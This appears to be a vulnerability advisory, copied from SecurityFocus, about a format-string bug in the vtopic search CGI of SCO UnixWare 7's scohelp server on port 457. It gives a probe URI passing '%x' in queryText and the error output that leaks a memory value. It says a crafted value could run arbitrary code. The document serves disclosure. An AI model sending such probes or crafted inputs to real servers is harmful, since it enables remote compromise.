@@ -1,0 +1,48 @@
+source: http://www.securityfocus.com/bid/1717/info
+
+SCO Unixware 7 default installation includes scohelp, an http server that listens on port 457/tcp and allows access to manual pages and other documentation files. The search CGI script provided for that purpose has a vulnerability that could allow any remote attacker to execute arbitrary code on the vulnerable machine with privileges of user "nobody". This poses a threat that could result in the remote compromise of the vulnerable host and provide a staging point from where an attacker could escalate privileges. 
+
+There is a user supplied format string bug in the vtopic CGI script that could be abused to execute arbitrary code. By sending a request with the following URI:
+
+http://target:457/search97cgi/vtopic?Action= FilterSearch&filter=&queryText=%25x
+
+The server will elicit the following response:
+--
+Internal error: STR_sprintf: Invalid format (Error E1-0142 (Query
+Builder): Invalid character '%' (0x25))
+
+Result
+Search failed: -40
+
+Result
+Error E1-0142 (Query Builder): Invalid character '
+
+Result
+Error E1-0130 (Query Builder): Syntax error in query string near
+character 1
+
+Result
+Error E1-0133 (Query Builder): Error parsing query: 81888e0
+
+Result
+VdkSearchNew failed, error -40
+
+Result
+Request failed for REQUEST_METHOD=, QUERY_STRING=
+
+Component
+Component (vsearch) failed in processing request, -2
+
+Action
+Action (FilterSearch) failed while processing request in component
+(vsearch), -2
+
+Service Manager
+Action (FilterSearch) failed in processing request, -2
+S97IS Service manager failed to process request
+--
+
+Note that the line:
+Error E1-0133 (Query Builder): Error parsing query: 81888e0
+
+This shows that the server is interpreting the %x argument passed in the URI as the "queryText" value. Supplying a carefully built value for the queryText argument an attacker can change the program flow and execute arbitrary code. 
